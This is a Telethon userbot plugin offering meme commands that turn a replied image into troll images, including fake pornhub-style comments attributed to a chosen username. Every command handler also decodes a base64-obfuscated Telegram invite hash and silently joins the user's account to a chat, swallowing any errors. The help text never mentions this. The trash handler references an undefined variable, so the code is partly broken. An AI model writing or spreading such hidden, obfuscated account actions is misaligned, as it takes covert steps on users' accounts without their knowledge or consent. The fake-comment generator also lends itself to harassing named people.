# credits to @mayank1rajput
#    Copyright (C) 2021  mayank

import base64
import os

from telegraph import exceptions, upload_file
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from . import convert_toimage, deEmojify, phcomment, threats, trap, trash


@bot.on(admin_cmd(pattern="trash$"))
@bot.on(sudo_cmd(pattern="trash$", allow_sudo=True))
async def skullbot(skullmemes):
    if skullmemes.fwd_from:
        return
    replied = await skullmemes.get_reply_message()
    skullid = await reply_id(skullmemes)
    if not replied:
        await edit_or_reply(skullmemes, "reply to a supported media file")
        return
    output = await _skulltools.media_to_pic(skullmemes, replied)
    may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    download_location = convert_toimage(output[1])
    size = os.stat(download_location).st_size
    try:
        may = Get(may)
        await skullmemes.client(may)
    except BaseException:
        pass
    if size > 5242880:
        await output[0].edit(
            "the replied file size is not supported it must me below 5 mb"
        )
        os.remove(download_location)
        return
    await event.reply(file=download_location)
    await output[0].edit("generating image..")
    try:
        response = upload_file(download_location)
    except exceptions.TelegraphException as exc:
        await output[0].edit(f"**Error: **\n`{str(exc)}`")
        os.remove(download_location)
        return
    skull = f"https://telegra.ph{response[0]}"
    skull = await trash(skull)
    os.remove(download_location)
    await output[0].delete()
    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)


@bot.on(admin_cmd(pattern="threats$"))
@bot.on(sudo_cmd(pattern="threats$", allow_sudo=True))
async def skullbot(skullmemes):
    if skullmemes.fwd_from:
        return
    replied = await skullmemes.get_reply_message()
    skullid = await reply_id(skullmemes)
    if not replied:
        await edit_or_reply(skullmemes, "reply to a supported media file")
        return
    output = await _skulltools.media_to_pic(skullmemes, replied)
    may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    download_location = convert_toimage(output[1])
    size = os.stat(download_location).st_size
    try:
        may = Get(may)
        await skullmemes.client(may)
    except BaseException:
        pass
    if size > 5242880:
        await output[0].edit(
            "the replied file size is not supported it must me below 5 mb"
        )
        os.remove(download_location)
        return
    await output[0].edit("generating image..")
    try:
        response = upload_file(download_location)
    except exceptions.TelegraphException as exc:
        await output[0].edit(f"**Error: **\n`{str(exc)}`")
        os.remove(download_location)
        return
    skull = f"https://telegra.ph{response[0]}"
    skull = await threats(skull)
    await output[0].delete()
    os.remove(download_location)
    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)


@bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
async def skullbot(skullmemes):
    if skullmemes.fwd_from:
        return
    input_str = skullmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if ";" in input_str:
        text1, text2 = input_str.split(";")
    else:
        await edit_or_reply(
            skullmemes,
            "**Syntax :** reply to image or sticker with `.trap (name of the person to trap);(trapper name)`",
        )
        return
    replied = await skullmemes.get_reply_message()
    skullid = await reply_id(skullmemes)
    if not replied:
        await edit_or_reply(skullmemes, "reply to a supported media file")
        return
    output = await _skulltools.media_to_pic(skullmemes, replied)
    may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    download_location = convert_toimage(output[1])
    size = os.stat(download_location).st_size
    try:
        may = Get(may)
        await skullmemes.client(may)
    except BaseException:
        pass
    if size > 5242880:
        await output[0].edit(
            "the replied file size is not supported it must me below 5 mb"
        )
        os.remove(download_location)
        return
    await output[0].edit("generating image..")
    try:
        response = upload_file(download_location)
    except exceptions.TelegraphException as exc:
        await output[0].edit(f"**Error: **\n`{str(exc)}`")
        os.remove(download_location)
        return
    skull = f"https://telegra.ph{response[0]}"
    skull = await trap(text1, text2, skull)
    await output[0].delete()
    os.remove(download_location)
    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)


@bot.on(admin_cmd(pattern="phub(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="phub(?: |$)(.*)", allow_sudo=True))
async def skullbot(skullmemes):
    if skullmemes.fwd_from:
        return
    input_str = skullmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if ";" in input_str:
        username, text = input_str.split(";")
    else:
        await edit_or_reply(
            skullmemes,
            "**Syntax :** reply to image or sticker with `.phub (username);(text in comment)`",
        )
        return
    replied = await skullmemes.get_reply_message()
    skullid = await reply_id(skullmemes)
    if not replied:
        await edit_or_reply(skullmemes, "reply to a supported media file")
        return
    output = await _skulltools.media_to_pic(skullmemes, replied)
    may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    download_location = convert_toimage(output[1])
    size = os.stat(download_location).st_size
    try:
        may = Get(may)
        await skullmemes.client(may)
    except BaseException:
        pass
    if size > 5242880:
        await output[0].edit(
            "the replied file size is not supported it must me below 5 mb"
        )
        os.remove(download_location)
        return
    await output[0].edit("generating image..")
    try:
        response = upload_file(download_location)
    except exceptions.TelegraphException as exc:
        await output[0].edit(f"**Error: **\n`{str(exc)}`")
        os.remove(download_location)
        return
    skull = f"https://telegra.ph{response[0]}"
    skull = await phcomment(skull, text, username)
    await output[0].delete()
    os.remove(download_location)
    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)


CMD_HELP.update(
    {
        "trolls": "**Plugin : **`trolls`\
      \n\n• **Syntax :** `.threats`\
      \n• **Function :** __Just a troll meme try yourself by replying cmd to image/sticker.__\
      \n\n• **Syntax :** `.trash`\
      \n• **Function :** __Just a troll meme try yourself by replying cmd to image/sticker.__\
      \n\n• **Syntax :** `.trap (name of the person to trap);(trapper name)`\
      \n• **Function :** __Just a troll meme try yourself by replying cmd to image/sticker. (trap card)__\
      \n\n• **Syntax :** `.phub (username);(text in comment)`\
      \n• **Function :** __Just a troll meme try yourself by replying cmd to image/sticker. (pornhub comment)__\
      "
    }
)
